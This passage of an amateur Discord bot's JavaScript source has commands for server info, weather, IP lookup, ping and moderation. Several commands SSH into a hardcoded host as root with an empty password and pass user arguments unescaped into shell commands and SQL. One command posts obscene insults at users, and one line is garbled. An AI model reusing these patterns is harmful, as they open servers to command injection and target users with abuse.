        "amsterdam": ":flag_nl: Amsterdam",
        "hongkong": ":flag_hk: Hong Kong",
        "russia": ":flag_ru: Russia",
        "southafrica": ":flag_za:  South Africa"
      };
      let member = message.guild.members;
      let channels = message.guild.channels;
      let text = channels.cache.filter(r => r.type === "text").size,
          vc = channels.cache.filter(r => r.type === "voice").size,
          totalchan = channels.cache.size;
      let offline = member.cache.filter(m => m.user.presence.status === "offline").size,
          online = member.cache.filter(m => m.user.presence.status === "online").size,
          robot = member.cache.filter(m => m.user.bot).size,
          total = message.guild.memberCount;
      const embed = new Discord.MessageEmbed();
      const embedcontent = message.content.substring[15];
      //const guild = client.guilds.get(`${message.guild.id}`);
    const date = message.guild.createdAt;
    const newDate = date.toLocaleDateString();
    const time = message.guild.createdAt;
    const newTime = time.toLocaleTimeString();
    embed.setColor(color=0x8000ff);
    embed.setThumbnail(icon)
    embed.setTitle(title=`${message.guild.name} - SERVER INFO:`)
    embed.addField("ID", message.guild.id, true)
    embed.addField("Region", region[message.guild.region], true)
    embed.addField("Owner", `${message.guild.owner.user.username}#${message.guild.owner.user.discriminator}`, true)
    embed.addField(`Members [${total}]`, `Online: ${online} \nOffline: ${offline} \nBots: ${robot}`, true)
    //var memberCount = guild.members.filter(member => !member.user.bot).size; 
    embed.addField(`Channels [${totalchan}]`, `Text: ${text} \nVoice: ${vc}`, true)
    embed.addField(name="Created on:", value=`${newDate} at ${newTime}`, true);
    message.channel.send(embed);
    console.log(`[ALERT] Command marky, serverinfo has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
    }
   //=======================================================================================================
      if(message.content.startsWith(`${PREFIX}userinfo`)) {
        let user;
        if (message.mentions.users.first()) {
            user = message.mentions.users.first();
        } else {
            user = message.author;
        }
        let avatar = user.avatarURL({size: 2048}); 
        const member = message.guild.member(user);
        const time = user.createdAt;
        const newTime = time.toLocaleTimeString();
        //if(user == 693496444182593666) return message.channel.send("no.")
        const embed = new Discord.MessageEmbed()
    embed.setColor(color=0x8000ff);
         embed.setThumbnail(avatar)
        embed.addField(`${user.tag}`, `${user}`, embed)
        embed.addField("ID:", `${user.id}`, embed)
        embed.addField("Nickname:", `${member.nickname !== null ? `${member.nickname}` : 'None'}`, embed)
        embed.addField("Status:", `${user.presence.status}`, embed)
        embed.addField("Game:", `${user.presence.game ? user.presence.game.name : 'None'}`, embed)
        embed.addField("Bot:", `${user.bot}`, embed)
        embed.addField("Joined The Server On:", `${moment(member.joinedAt).format("dddd, MMMM Do YYYY")}`, embed)
        embed.addField("Account Created On:", `${moment(user.createdAt).format("dddd, MMMM Do YYYY")} at ${newTime}`, embed) 
        embed.addField("Roles:", member.roles.cache.map(roles => `${roles}`).join(' , '), embed)
        embed.setFooter(text="Copyright © Marky Discord Bot (2020-2021)");
        message.channel.send(embed);
        console.log(`[ALERT] Command marky, userinfo has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
    }
  if(message.content.startsWith(`${PREFIX}avatar`)) {
    let user;
    if (message.mentions.users.first()) {
        user = message.mentions.users.first();
    } else {
        user = message.author;
    }
    let avatar = user.avatarURL({size: 2048});
    message.channel.send(avatar)
  }
  if(message.content.startsWith(`${PREFIX}weather`)) {

    if(!args[1]) return message.channel.send("```Syntax: marky, weather [Location]```")
    weather.find({search: args.join(" "), degreeType: 'C'}, function(err, result) { // Make sure you get that args.join part, since it adds everything after weather.
      if (err) message.channel.send(err);

      // We also want them to know if a place they enter is invalid.
      if (result.length === 0) {
          message.channel.send('Unknown location.') // This tells them in chat that the place they entered is invalid.
          return; // This exits the code so the rest doesn't run.
      }
      var current = result[0].current; 
      var location = result[0].location; 
      // Let's use an embed for this.bbbb
      const embed = new Discord.MessageEmbed()
      embed.setDescription(`**${current.skytext}**`) // This is the text of what} the sky looks like, remember you can find all of this on the weather-js npm page.
      embed.setAuthor(`Weather for ${current.observationpoint}`) // This shows the current location of the weather.
      embed.setThumbnail(current.imageUrl) // This sets the thumbnail of the embed
      embed.setColor(color=0x8000ff); // This sets the color of the embed, you can set this to anything if you look put a hex color picker, just make sure you put 0x infront of the hex
      embed.addField('Timezone',`UTC${location.timezone}`, true) // This is the first field, it shows the timezone, and the true means `inline`, you can read more about this on the official discord.js documentation
      embed.addField('Degree Type',location.degreetype, true)// This is the field that shows the degree type, and is inline
      embed.addField('Temperature',`${current.temperature} Degrees`, true)
      embed.addField('Feels Like', `${current.feelslike} Degrees`, true)
      embed.addField('Winds',current.winddisplay, true)
      embed.addField('Humidity', `${current.humidity}%`, true)
      embed.setFooter(text="Copyright © Marky Discord Bot (2020-2021)");
       message.channel.send({embed});
  });
  console.log(`[ALERT] Command marky, weather has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
  }
  //=======================================================================================================
  if (message.content.startsWith(`${PREFIX}info`)) {

    message.channel.send("Connecting to server...").then((msg) => {
      const SSH = require('simple-ssh');
      var ssh = new SSH({
        host: '188.214.88.138',
        user: 'root',
        pass: '',
      });
      ssh.exec('echo $PATH', {
        out: function(stdout) {
            console.log(stdout);
        }
      }).start();
      msg.edit(`Connection estabilished ! Please wait...`).then((msg) => {
        ssh.exec(`uptime -p > logserver2.txt`)
        ssh.exec("head logserver2.txt", {
          out: function (outubuntu) {
            setTimeout(function () {
            msg.delete()
            let Geo = new Discord.MessageEmbed();
            let totalSeconds = (bot.uptime / 1000);
            let days = Math.floor(totalSeconds / 86400);
            let hours = Math.floor(totalSeconds / 3600);
            totalSeconds %= 3600;
            let minutes = Math.floor(totalSeconds / 60);
            let seconds = Math.floor(totalSeconds % 60);
            var uptime = outubuntu;
            var res = uptime.replace("up ","");
            Geo.setColor(color=0x8000ff);
            Geo.setTitle(`Marky Bot Informations:`)
            Geo.setThumbnail("https://cdn.discordapp.com/avatars/693496444182593666/a3451d48f403766f72fa6d1cbe8edd58.webp?size=2048");
            Geo.addField(name=`Created on:`, value=`28.03.2020`, Geo); 
            Geo.addField(name=`Developed by:`, value=`m0untain#8342`, Geo); 
            Geo.addField(name=`Version:`, value=botversion, Geo);
            Geo.addField(name=`Last update:`, value=`10.10.2020 - 01:10 PM`, Geo);
            Geo.addField(name=`Currently in:`, value=`${bot.guilds.cache.size} servers.`, Geo);
            Geo.addField(name=`Users:`, value=`${bot.users.cache.size}`, Geo);
            Geo.addField(name=`Last restart:`, value=`${lastrestart}`, Geo)
            Geo.addField(name=`BOT uptime:`, value=`${days} days, ${hours} hours, ${minutes} minutes`, Geo);
            Geo.addField(name=`Server hostname:`, value=`server1oradea-markybot`, Geo);
            Geo.addField(name=`Server uptime:`, value=res, Geo);
            Geo.addField(name=`OS platform:`, value=`linux`, Geo);
            Geo.addField(name=`Kernel`, value=`5.3.0-18-generic`, Geo);
            Geo.setFooter(text="Copyright © Marky Discord Bot (2020-2021)");
          message.channel.send(Geo);
          ssh.end()
            }, 500);
          }
        })
      })
    })
    console.log(`[ALERT] Command marky, info has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
  }
  //=======================================================================================================
  const applyText = (canvas, text) => {
    const ctx = canvas.getContext('2d');
  
    // Declare a base size of the font
    let fontSize = 70;
  
    do {
      // Assign the font to the context and decrement it so it can be measured again
      ctx.font = `${fontSize -= 10}px sans-serif`;
      // Compare pixel width of the text to the canvas minus the approximate avatar size
    } while (ctx.measureText(text).width > canvas.width - 300);
  
    // Return the result to use in the actual canvas
    return ctx.font;
  };

  //=======================================================================================================
  if(message.content.startsWith(`${PREFIX}injural`))
  {
      let options = ["isi baga pula in mortii tai","isi baga pula in ma ta","a zis sa sugi pula","te umple de variala","iti bag pula in gura",
      "isi da drumu pe fata ta","a zis ca-ti mai face un fratior","a zis ca a rupt pizda n ma ta","are bucurii la ma-ta","a zis ca iti ia rasa in pula",
      "a zis sa-i lingi coaiele","iti da cu pula pe ochi","o duce pe ma-ta pe Elvetia"];
      let user;
      if (message.mentions.users.first()) {
          user = message.mentions.users.first();
      } else {
          return message.reply("zi pa cine sa injur")
      }
      if (user == 693496444182593666) return message.reply("ba cacatule, tu pe mine nu ma injuri ca iti fut una de vezi stele verzi.")
      else if (user == bot) return message.reply("idiotule, cum sa injur roboti ?")
      else if (user == 309333602129281027) return message.reply("idiotu pulii, eu nu imi injur tatal")
      var response = options[Math.floor(Math.random()*options.length)];
      message.channel.send(`${user}, ${message.author.username} ${response}`);
  }
  // new ping <3
  if(message.content.startsWith(`${PREFIX}ping`)) {
    if(!args[1]) {
      message.channel.send("Checking syntax...").then(m =>{
        var ping = m.createdTimestamp - message.createdTimestamp;
        var botPing = Math.round(bot.pi);

        return m.edit(`:ping_pong:  Pong ! Server response time: ${ping}ms`);
    });
    }
    else
    message.channel.send("Checking syntax...").then((msg) => {
    var str = args[1];
    str.replace(";"," ")
    snekfetch.get(`http://ip-api.com/json/${args[1]}`).then(r => {
    if(r.body.status == "fail") return msg.edit(`ping: ${str}: Name or service not known`);
      ping.promise.probe(str, {
        deadline: 3
    }).then(function (res) {
      if(res.host == `unknown`) return msg.edit(`ping: ${str}: Name or service not known`)
        var cfg = {
          timeout: 10,
          // WARNING: -i 2 may not work in other platform like window
          extra: ['-i', '2'],
      };
      msg.edit(`Pinging ${str}...`).then((msg) => {
      var host = str;
      ping.sys.probe(host, function(isAlive){
              var iponline = isAlive ? 'online' : 'offline';
              console.log(iponline);
        const embed = new Discord.MessageEmbed();
        const embedcontent = message.content.substring[15];
        embed.setDescription("  ");
        embed.setTitle(`Ping results for ${str}`);
        embed.setColor(color=0x8000ff);
        embed.addField(
          (name = `IP:`),
          (value = str),
          embedcontent
        );
        embed.addField(
          (name = `Status:`),
          (value = iponline),
          embedcontent
        );
        embed.addField(
          (name = "Output:"),
          (value = res.output),
          embedcontent
        );
        msg.delete();
        message.channel.send(embed);        
        console.log(`[ALERT] Command marky, ping has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
      })
    })
  })
    })
  })
  }
  // old ping <3
  /*
  if (message.content.startsWith(`${PREFIX}ping`)) {
    // ...
    if(!args[1]) return message.channel.send("```ERROR: You need to input a IP in order to ping it```");
    message.channel.send("Connecting to server...").then((msg) => {
      const SSH = require('simple-ssh');
      var ssh = new SSH({
        host: '188.214.88.138',
        user: 'discord',
        pass: '',
        agent: process.env.SSH_AUTH_SOCK
      });
      ssh.exec('echo $PATH', {
        out: function(stdout) {
            console.log(stdout);
        }
      }).start();
      msg.edit(`Connection estabilished ! Pinging...`).then((msg) => {
        ssh.exec(`ping -c 2 ${args[1]} > logserver1.txt;`)
          ssh.exec("head logserver1.txt", {
          out: function (outubuntu) {
            setTimeout(function () {
              snekfetch.get(`http://ip-api.com/json/${args[1]}`).then(r => {
              if(r.body.as == undefined) return msg.edit("```ERROR: Invalid IP!```");
              const embed = new Discord.MessageEmbed();
              const embedcontent = message.content.substring[15];
              var cfg = {
                timeout: 10,
                // WARNING: -i 2 may not work in other platform like window
                extra: ['-i', '2'],
            };
            var host = args[1]
            ping.sys.probe(host, function(isAlive){
                    var iponline = isAlive ? 'online' : 'offline';
                    console.log(iponline);
              embed.setDescription("  ");
              embed.setTitle("PingIP");
              embed.setColor(color=0x8000ff);
              embed.setAuthor((name = "Ping Info:"));
              embed.addField(
                (name = `IP:`),
                (value = `${args[1]}`),
                embedcontent
              );
              embed.addField(
                (name = `Status:`),
                (value = iponline),
                embedcontent
              );
              embed.addField(
                (name = "Output:"),
                (value = `${outubuntu}`),
                embedcontent
              );
              msg.edit(embed);
              ssh.end();
            }, cfg);
          })
            }, 500);
        }
        })
        .start();
      })
    });
    console.log(`[ALERT] Command marky, ping has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
    fs.readFileSync('commandhistory.txt', 'utf-8');
    fs.writeFileSync('commandhistory.txt', `[ALERT] Command marky, ping has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`, (err) => {
      if (err) throw err;
      })
  }
  */
  //==============================================================================================
  if(message.content.startsWith(`${PREFIX}invite`)) {
  
    message.channel.send("Invite Link:https://discord.com/oauth2/authorize?client_id=693496444182593666&scope=bot&permissions=1341652425")
    console.log(`[ALERT] Command marky, invite has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
  }
  if(message.content.startsWith(`${PREFIX}changechannel`)) {
    if(message.author != 309333602129281027) return message.channel.send("```ERROR: PRIVATE COMMAND !```")
    if(!args[1]) return message.channel.send("```Usage: marky, changechannel [id]```");
    channelsetted = args[1];
    message.channel.send("```Channel changed !```");
  }
  //==============================================================================================
    if(message.content.startsWith(`${PREFIX}changeactivity`)) {

    let args2 = message.content.substring(PREFIX.length).split(" ")
    if(!args2) return message.channel.send("```Usage: marky, changeactivity <activity text - types> <activity type>```");
    if(args2 == "types")
    {
      let Geo = new Discord.MessageEmbed();
      Geo.setColor(color=0x8000ff);
      Geo.setTitle(`Activity Types:`)
      Geo.setDescription(`  `)
      Geo.addField(name=`PLAYING`, value=`1`, Geo); 
      Geo.addField(name=`STREAMING`, value=`2`, Geo); 
      Geo.addField(name=`LISTENING`, value=`3`, Geo);
      Geo.addField(name=`WATCHING`, value=`4`, Geo);
    message.channel.send(Geo);        
    }
    if(!args[2]) return message.channel.send("```Usage: marky, changeactivity <activity text - types> <activity type>```");
    if(args[2] < 1 || args[2] > 4) return message.channel.send("ERROR: INVALID STATUS!")
    message.channel.send("Checking permissions...").then((msg) => {
    if(message.author == 309333602129281027) 
    {
      clearInterval(timeractivity);
      const sayMessage = args.join(" ").slice(22);
      bot.user.setActivity(`${sayMessage}`, { type: args[2] });
      msg.edit("Activity Changed !") 
    }
    else
    {
      msg.edit("Insufficient permissions !");
    }
    })
  }
if(message.content.startsWith(`${PREFIX}switchserver`)) {
  if(!args[1]) return message.channel.send("```Syntax: marky, switchserver [Server ID]```"), message.channel.send("`Server 1: backup1voluntari-markybot` `Server 2: server-parodii-tk`")
  message.channel.send("Checking permissions...").then((msg) => {
  if(message.author == 309333602129281027) 
  {
    if(args[1] == 1)
    {
      msg.edit("Switching to **backup1voluntari-markybot** (Voluntari, Ilfov, Romania)")
    }
    if(args[1] == 2)
    {
      msg.edit("Switching to **server-parodii-tk** (Tunari, Ilfov, Romania)")
    }
  }
  else
  {
    msg.edit("Insufficient permissions !")
  }
    })
  } 
if(message.content.startsWith(`${PREFIX}restartbot`)) {
  message.channel.send("Checking permissions...").then((msg) => {
  if(message.author == 309333602129281027) 
  {
    var ziua = new Date().getDate();
    if(ziua < 10)
    {
      var strziua = "0"+ziua;
    }
    else
    {
      var strziua = ziua;
    }
    var luna = new Date().getMonth() + 1;
    if(luna < 10)
    {
      var strluna = "0"+luna;
    }
    else
    {
      var strluna = luna;
    }
    var an = new Date().getFullYear();
    var ora = new Date().getHours();
    if(ora < 10)
    {
      var strora = "0"+ora;
    }
    else
    {
      var strora = ora;
    }
    var minut = new Date().getMinutes();
    if(minut < 10)
    {
      var strminut = "0"+minut;
    }
    else
    {
      var strminut = minut;
    }
    var secunda = new Date().getSeconds();
    if(secunda < 10)
    {
      var strsecunda = "0"+secunda;
    }
    else
    {
      var strsecunda = secunda;
    }
  msg.edit(`Server Return: BOT will restart in a few seconds | Request sent at: ${strziua}/${strluna}/${an} ${strora}:${strminut}:${strsecunda} `) 
  bot.users.fetch("309333602129281027",false).then(user => {
    user.send(`[ALERT] Marky has been restarted by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id} | Request send at: ${strziua}/${strluna}/${an} ${strora}:${strminut}:${strsecunda}`);
  setTimeout(function () {
  bot.user.setActivity(`and spying on ${bot.gutweailds.cacheatweawet.size} servers`, { type: tawte });
  }, 1000);
  })
}
else
{
  msg.edit("Insufficient permissions !")
}
  })
}
if(message.content.startsWith(`${PREFIX}sampserver`))
{
  if(message.author != 309333602129281027) return message.channel.send("```ERROR: Private command !```");
  if(!args[1]) return message.channel.send("```Usage: marky, sampserver <start><stop><restart><status> ```")
  message.channel.send("Connecting to server...").then((msg) => {
    const SSH = require('simple-ssh');
    var ssh = new SSH({
      host: '188.214.88.138',
      user: 'root',
      pass: '',
      agent: process.env.SSH_AUTH_SOCK
    });
    ssh.exec('echo $PATH', {
      out: function(stdout) {
          console.log(stdout);
      }
    }).start(); 
    msg.edit(`Connection estabilished ! Sending info to server...`).then((msg) => {
    ssh.exec(`/home/samp03/./samp.sh ${args[1]}`, {
      out: function (stdout) {
        ssh.end();
      msg.edit(`${stdout}`);
      }
    })
  })
})
}
if (message.content.startsWith(`${PREFIX}timer`)) {
  let seconds;
  if(!args[1]) return message.channel.send("```Syntax: marky, timer [Seconds]```")
  message.channel.send("Timer started...").then((msg) => {
    seconds = args[1] * 1000;
    setTimeout(function () {

      msg.edit(`${args[1]} seconds passed.`)
      
    }, seconds)   
  })
}
    if(message.content.startsWith(`${PREFIX}covid`)) {

      if(!args[1]) return message.channel.send("```Syntax: marky, covid [Country]```");
      message.channel.send("Checking syntax...").then((msg) => {
      snekfetch.get(`https://covid2019-api.herokuapp.com/v2/country/${args[1]}`).then(r => {
        let Geo = new Discord.MessageEmbed()
        if(r.body.data.location == undefined) return msg.edit("Unknown location.")
        Geo.setTimestamp()
          Geo.setColor(color=0x8000ff);
          Geo.setTitle(`COVID-19 Data:`)
          Geo.setDescription(`COVID Information for ${r.body.data.location}`)
          Geo.addField(name=`Total Confirmed Cases:`, value=`${r.body.data.confirmed}`, Geo); 
          Geo.addField(name=`Total Deaths:`, value=`${r.body.data.deaths}`, Geo); 
          Geo.addField(name=`Total Recovered:`, value=`${r.body.data.recovered}`, Geo); 
          Geo.addField(name=`Active Cases:`, value=`${r.body.data.active}`, Geo); 
          Geo.addField(name=`Last Update:`, value=`${r.body.dt}`, Geo);  
          Geo.setFooter(`Executed By: ${message.author.tag}`);
          msg.delete()
        message.channel.send(Geo);
      });
    })
      console.log(`[ALERT] Command marky, covid has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
    }
    if (message.content.startsWith(`${PREFIX}ipinfo`)) {
      // ...
      if(!args[1]) return message.channel.send("```Syntax: marky, ipinfo [IP]```");
  
      message.channel.send("Checking syntax...").then((msg) => {
      snekfetch.get(`http://ip-api.com/json/${args[1]}`).then(r => {
        let Geo = new Discord.MessageEmbed()
        if(r.body.status == "fail") return msg.edit(`ipinfo: ${args[1]}: Name or service not known`);
          Geo.setColor(color=0x8000ff);
          Geo.setTitle(`IP Info for ${args[1]}:`)
          Geo.addField(name=`Target:`, value=`${args[1]}`, Geo); 
          Geo.addField(name=`ASN:`, value=`${r.body.as}`, Geo); 
          Geo.addField(name=`ISP:`, value=`${r.body.isp}`, Geo); 
          Geo.addField(name=`City:`, value=`${r.body.city}`, Geo); 
          Geo.addField(name=`Region:`, value=`${r.body.regionName}(${r.body.region})`, Geo); 
          Geo.addField(name=`Country:`, value=`${r.body.country}(${r.body.countryCode})`, Geo); 
          Geo.addField(name=`Timezone:`, value=`${r.body.timezone}`, Geo); 
          Geo.setFooter(text="Copyright © Marky Discord Bot (2020-2021)");
          msg.delete();
        message.channel.send(Geo);
      });
    })
  
      fs.readFileSync('commandhistory.txt', 'utf-8');
      fs.writeFile('commandhistory.txt', `[ALERT] Command marky, ipinfo has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`, (err) => {
        if (err) throw err;
        console.log(`[ALERT] Command marky, ipinfo has been executed by ${bot.users.cache.get(message.author.id).tag} in server ${message.guild.name} ID: ${message.guild.id}`)
    })
  }
  if(message.content.startsWith(`${PREFIX}leaveguild`))
  {
    if(!args[1]) return message.channel.send("```Syntax: marky, leaveguild [Guild ID]```")
    message.channel.send("Checking permissions...").then((msg) => {
    if(message.author == 309333602129281027)
    {
      var id = args[1];
      msg.edit(`Left guild ${args[1]}`)
      bot.guilds.cache.get(id).leave()
      .catch(err => {
          msg.edit(`Oops ! Something went wrong... :(\n ${err.message}`);
        })
    }
    else
    {
      msg.edit("Insufficient permissions !")
    }
      })
  }
  if(message.content.startsWith(`${PREFIX}contact`)) {

    let Contact = new Discord.MessageEmbed;
    Contact.setColor(color=0x8000ff);
    Contact.setTitle(`Marky BOT Contact Info`)
    Contact.setDescription(`For informations, business inquiries or bug report, you can contact my owner on:`)
    Contact.addField(name="Discord:", value="m0untain#0001", Contact)
    Contact.addField(name="Email:", value="mihneaamuzantul@gmail.com", Contact)
    Contact.addField(name="Instagram:", value="@mihneast", Contact)
    Contact.setFooter(text="Copyright © Marky Discord Bot (2020-2021)");
    message.channel.send(Contact);

  }
  if(message.content.startsWith(`${PREFIX}credits`)) {

    let Contact = new Discord.MessageEmbed;
    Contact.setColor(color=0x8000ff);
    Contact.setTitle(`Marky BOT Credits Info`)
    Contact.setDescription(`Here are displayed all the people that contributed to Marky BOT.`)
    Contact.addField(name="Scripters", value="m0untain#0001 - Founder and Code Developer", Contact)
    Contact.addField(name="Special thanks for ideas:", value="phnzr#3280(inspiration from Controlul de Calitate BOT)\nzentro#5191\nKeedyy#7173\nEnderIce2#6014\nPh0eniX#9713\nKimiksen#3122", Contact)
    Contact.addField(name="Packages:", value="Discord.JS - Authors: crawl, gawdl3y, hydrabolt, lewdcario, spaceeec\nmysql - Authors: dougwilson, felixge, nate.lillich, sidorares\n Ping - Author: danielzzz\nWeather-JS - Author: devfacet\nSimple SSH - Author: mcluck\nsamp-query - Author: jjjan\nsysteminformation - Author: plusinnovations\n", Contact)
    Contact.setFooter(text="Copyright © Marky Discord Bot (2020-2021)");
    message.channel.send(Contact);

  }
  if(message.content.startsWith(`${PREFIX}instalookup`)) {
    var ig = require('instagram-scraping');
    message.channel.send("Checking syntax...").then(m =>{
    if(!args[1]) {
        return m.edit("```Syntax: marky, instalookup [Instagram ID]```");
    }
    else
    {
      let insta = new Discord.MessageEmbed;
      ig.scrapeUserPage(args[1]).then(result => {
        if (result.user.full_name == undefined) return m.edit("Invalid Page !")
        insta.setTitle(`${result.user.username} - INFO`)
        insta.setColor(color=0x8000ff); 
        insta.setThumbnail(result.user.profile_pic_url_hd)
        insta.addField("ID:", result.user.id, insta)
        insta.addField("Full Name:", result.user.full_name, insta)
        insta.addField("Followers:", require('util').inspect(result.user.edge_followed_by.count), insta)
        insta.addField("Following:", require('util').inspect(result.user.edge_follow.count), insta)
        insta.addField("Business account:", result.user.is_business_account, insta)
        insta.addField("Private account:", result.user.is_private, insta)
        insta.addField("Verified account:", result.user.is_verified, insta)
        if(result.user.external_url == null)
        {
          insta.addField("Biography:", `${result.user.biography}`, insta)
        }
        else
        {
          insta.addField("Biography:", `${result.user.biography}\n${result.user.external_url}`, insta)
        }
        m.delete();
        message.channel.send(insta)
      })
    }  
    });  
  }
  if(message.content.startsWith(`${PREFIX}purge`))
  {
    const amount = args[1];
    if(!amount) return message.channel.send ("```Syntax: marky, purge [Messages to delete]```")
    if(amount > 100) return message.channel.send("You cannot clear more than 100 messages !")
    if(amount < 1) return message.channel.send("You cannot clear less than 1 message !")
    if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.send("Insufficient permissions !")
    if(!isNaN(amount))
    {

      await message.channel.messages.fetch({limit: amount}).then(messages => {
        message.channel.bulkDelete(messages )});
        message.channel.send(":white_check_mark:")
    }
    else return message.channel.send("This argument can only handle numbers !")
          }
    //======================================================================================================
    //Coins system
    //======================================================================================================
    if(message.guild.id == 725112057979994185)
    {
        con.query(`SELECT * FROM tlccoins WHERE ID= '${message.author.id}'`, function (err, rows) {
        if(!rows[0]) return con.query(`INSERT INTO tlccoins(ID, Coins, CurrentRole, CurrentBoost) VALUES ('${message.author.id}', '0', '0', '0')`)
        else
        {
          let newcoins = rows[0].Coins + 1;
          con.query(`UPDATE tlccoins SET Coins='${newcoins}' WHERE ID='${message.author.id}'`);
        }
      })
    }
}
   })
  bot.login(token);
